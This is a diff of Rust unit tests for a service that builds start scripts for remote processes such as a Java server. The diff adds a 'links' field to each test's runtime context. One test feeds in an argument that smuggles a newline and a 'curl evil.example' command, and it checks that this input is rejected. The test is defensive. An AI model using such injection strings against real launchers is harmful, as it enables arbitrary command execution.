@@ -496,7 +496,7 @@ mod tests {
         let config = RemoteProcessConfig { command: "/usr/bin/java".into(), args: vec!["-jar".into(), "server.jar".into()], cpu_limit_cores: None };
         let environment = vec![EnvironmentVariable { key: "PORT".into(), value: "25565".into(), is_secret: false }];
         let config_value = serde_json::to_value(&config).unwrap();
-        let ctx = RuntimeContext { application: &application, runtime_config: &config_value, environment: &environment, ports: &[], connection: None };
+        let ctx = RuntimeContext { application: &application, runtime_config: &config_value, environment: &environment, ports: &[], links: &[], connection: None };
 
         let script = build_start_script(&ctx, &config).unwrap();
 
@@ -513,7 +513,7 @@ mod tests {
         let application = stub_application(Uuid::new_v4());
         let config = RemoteProcessConfig { command: "/usr/bin/java".into(), args: vec![], cpu_limit_cores: Some(1.5) };
         let config_value = serde_json::to_value(&config).unwrap();
-        let ctx = RuntimeContext { application: &application, runtime_config: &config_value, environment: &[], ports: &[], connection: None };
+        let ctx = RuntimeContext { application: &application, runtime_config: &config_value, environment: &[], ports: &[], links: &[], connection: None };
 
         let script = build_start_script(&ctx, &config).unwrap();
 
@@ -531,7 +531,7 @@ mod tests {
         let application = stub_application(Uuid::new_v4());
         let config = RemoteProcessConfig { command: "/usr/bin/java".into(), args: vec![], cpu_limit_cores: None };
         let config_value = serde_json::to_value(&config).unwrap();
-        let ctx = RuntimeContext { application: &application, runtime_config: &config_value, environment: &[], ports: &[], connection: None };
+        let ctx = RuntimeContext { application: &application, runtime_config: &config_value, environment: &[], ports: &[], links: &[], connection: None };
 
         let script = build_start_script(&ctx, &config).unwrap();
 
@@ -543,7 +543,7 @@ mod tests {
         let application = stub_application(Uuid::new_v4());
         let config = RemoteProcessConfig { command: "/bin/sh".into(), args: vec!["-c\ncurl evil.example".into()], cpu_limit_cores: None };
         let config_value = serde_json::to_value(&config).unwrap();
-        let ctx = RuntimeContext { application: &application, runtime_config: &config_value, environment: &[], ports: &[], connection: None };
+        let ctx = RuntimeContext { application: &application, runtime_config: &config_value, environment: &[], ports: &[], links: &[], connection: None };
 
         assert!(build_start_script(&ctx, &config).is_err());
     }
@@ -554,7 +554,7 @@ mod tests {
         let config = RemoteProcessConfig { command: "/usr/bin/java".into(), args: vec![], cpu_limit_cores: None };
         let environment = vec![EnvironmentVariable { key: "NOT VALID".into(), value: "x".into(), is_secret: false }];
         let config_value = serde_json::to_value(&config).unwrap();
-        let ctx = RuntimeContext { application: &application, runtime_config: &config_value, environment: &environment, ports: &[], connection: None };
+        let ctx = RuntimeContext { application: &application, runtime_config: &config_value, environment: &environment, ports: &[], links: &[], connection: None };
 
         assert!(build_start_script(&ctx, &config).is_err());
     }
@@ -569,7 +569,7 @@ mod tests {
     async fn methods_that_need_a_connection_fail_cleanly_without_one() {
         let application = stub_application(Uuid::new_v4());
         let config = serde_json::json!({ "command": "/usr/bin/java", "args": [] });
-        let ctx = RuntimeContext { application: &application, runtime_config: &config, environment: &[], ports: &[], connection: None };
+        let ctx = RuntimeContext { application: &application, runtime_config: &config, environment: &[], ports: &[], links: &[], connection: None };
         let runtime = RemoteProcessRuntime::new();
 
         assert!(matches!(runtime.validate(&ctx).await, Err(AppError::Internal(_))));
